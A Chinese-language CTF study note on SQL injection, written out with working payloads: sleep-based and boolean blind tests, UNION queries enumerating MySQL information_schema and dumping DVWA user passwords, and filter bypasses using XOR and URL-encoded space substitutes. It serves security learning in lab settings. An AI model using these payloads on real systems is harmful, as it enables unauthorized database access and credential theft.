# sql 注入

1，构造错误

使用‘或者’‘，先判断是否有sql注入，后面的通过	--	’将原有代码的后续注释掉。

2，时间盲注与布尔盲注

有时候并不会返回查询结果，所以需要盲注判断是否有sql注入

（1，时间盲注

```sql
' and sleep(5) -- '
```

这样可以通过页面的停顿检验是否有sql注入

（2，布尔盲注

布尔逻辑注入的思路是闭合SQL语句、构造or和and逻辑语句、注释多余的代码。

3，union注入

首先猜测数据列数 

```
' union select 1 -- ' 
' union select 1,2 -- ' 
' union select 1,2,3 -- ' 
' union select 1,2,3,4 -- ’
```

 之后可以查询database（），version（），user（）等查看数据库类型，用户名，版本等。

以MySQL数据库为例（比赛常见的），MySQL数据库有一个显著的特点就是information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。

接下来我们可以通过构造sql语句，查询我们感兴趣的数据库->感兴趣的表->找出表中重要的行

- `CONCAT`函数用于将多个字符串值拼接成一个字符串。比如只有一个注入点，可以使用concat（id，user，password）一次性查询到三个数据
- `GROUP_CONCAT`函数用于将多个行的值拼接成一个字符串，例如，如果你有一个包含多个行的`names`列，`GROUP_CONCAT(names SEPARATOR ', ')`将返回所有`names`值的以逗号分隔的单个字符串。

//查询所有库名 

```
'union select TABLE_SCHEMA, 1 from INFORMATION_SCHEMA.tables -- '
```

//查看所库中所有表名 

```
'union select table_name, 1 from INFORMATION_SCHEMA.tables -- '
```

//查询dvwa这个库下的表

```
'union select table_name, 1 from INFORMATION_SCHEMA.tables where TABLE_SCHEMA='dvwa' -- '
```

//查询user这个表的行

```
'union select table_name, COLUMN_NAME from INFORMATION_SCHEMA.columns
where TABLE_SCHEMA='dvwa' and TABLE_NAME='users' -- ' 
```

使用contact更直观查询

```
'union select user_id, concat(first_name,' ',last_name,' ',user,'
',password) from dvwa.users -- '
```

## 2，常见的sql过滤

上面介绍的只是很简单的sql注入程序。实际上可能会有对某些特定字符的检查，比如

[华北赛区 day2 web1 hack world]: https://www.cnblogs.com/upfine/p/16529318.html



这个题对union，and这些包括空格都过滤了。（可以使用fuzz对sql过滤的进行检测）

在盲注时候发现1/2返回异常，猜测是布尔盲注。但是union，and，or这些都过滤了。发现^这个异或没有过滤，且有布尔注入。

我们可以考虑构造payload使用异或，select。我每次从flag里提取一个字符，枚举这个字符大小。如果他大了，或者小了，他的结果是0/1。我们可以根据这个区别进行当前flag的字符枚举判断。

而且我们这里使用不了空格，对于空格替代，我们有多种思路

1，16进制编码。2，（）代替。3，tab建代替。三种均可尝试，实验中我选择第二种。还有%20 %09 %0a %0b %0c %0d %a0 /**/这些方式可以绕过空格

- `%20` 是URL编码中的空格字符。在URL中不能使用普通的空格，因此使用 `%20` 来代替。
- `%09` 是水平制表符（Tab）的URL编码。
- `%0a` 是换行符（LF）的URL编码。
- `%0b` 是垂直制表符的URL编码。
- `%0c` 是换页符的URL编码。
- `%0d` 是回车符（CR）的URL编码。
- `%a0` 是不间断空格（non-breaking space）的URL编码。

这里就需要写脚本。

------

这一道题算是比较简单的，因为他指明从flag数据库获取flag列，那么如果没有这些提示呢，我们需要自己手动注入来进行查询，步骤又回到我们的第一个程序。

------

[[WUSTCTF2020]颜值成绩查询](https://www.cnblogs.com/upfine/p/16367693.html)



